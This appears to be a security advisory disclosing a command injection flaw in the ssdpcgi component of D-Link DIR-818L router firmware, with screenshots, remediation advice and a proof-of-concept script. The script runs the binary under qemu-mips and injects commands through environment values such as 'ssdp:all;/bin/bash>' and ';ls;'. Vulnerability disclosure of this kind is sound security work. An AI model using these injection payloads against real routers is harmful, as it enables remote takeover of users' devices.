# Remote Arbitrary Command Execution Vulnerability in ssdpcgi of D-Link DIR‑818L

# Vulnerability Summary

Vendor: D-Link

Affected Product: D-Link DIR‑818L

Affected Version: Firmware versions ≤ v1.05B01

Vulnerability Type: Remote Arbitrary Command Execution

# Vulnerability Description
The D-Link DIR‑818L is a wireless router developed by D-Link, mainly designed for home and small office users.

A command injection vulnerability exists in the ssdpCgi component of the D-Link DIR‑818L router. This component retrieves parameters using the getenv function. An attacker can craft a malicious request to inject arbitrary commands into the argument passed to the lxmldbc_system function, which eventually gets executed by system, resulting in remote command execution. This can be exploited to gain reverse shell access or full control over the device.

The vulnerable program obtains input via environment variables using getenv, but fails to properly sanitize special characters that could lead to command execution (such as ;, |, etc.). Due to this incomplete filtering, an attacker can inject malicious strings like ssdp:all+<command>, which get passed into the lxmldbc_system function. Internally, this function uses sprintf to concatenate strings and system to execute them. As a result, attackers can exploit this to trigger command injection and achieve remote code execution, such as launching a reverse shell.

![image-20250701183716269](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701183716269.png)

![image-20250701184135375](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701184135375.png)

![image-20250701184218430](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701184218430.png)



POC

```
from pwn import*
context.terminal = ['gnome-terminal', '--', 'bash', '-c']
context.arch='mips'
context.os='linux'
context.endian = 'big'
context.log_level = 'debug'
def bug():
    gdb.attach(target=("localhost", 8888), exe="./htdocs/cgibin",
               gdbscript="""
               b *0x40E0F4\n    
               c\n
               """)
    pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')


#cmd=input("command:")
pay=cyclic(0x100)
print(pay)
post_content = "Thir0th=AGRiot"
p = process(f'''
qemu-mips -L . \
  -0 "ssdpcgi" \
  -E HTTP_ST="ssdp:all;/bin/bash>" \
  -E REMOTE_ADDR="{pay}" \
  -E REMOTE_PORT=";ls;" \
  -E SERVER_ID="router" \
  -g 8888 \
  ./htdocs/cgibin ssdpcgi
''',shell=True)
bug()


p.send(post_content)







inter()
```

Successful Execution:

![image-20250721154450171](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250721154450171.png)

# Remediation Recommendations
Upgrade to the latest firmware version provided by D-Link that includes security patches.

Implement strict input validation and whitelist-based filtering before executing commands.

Avoid using insecure functions such as system() or sprintf() for command construction and execution.

Add access control mechanisms and authentication checks to restrict unauthorized access to the vulnerable interface.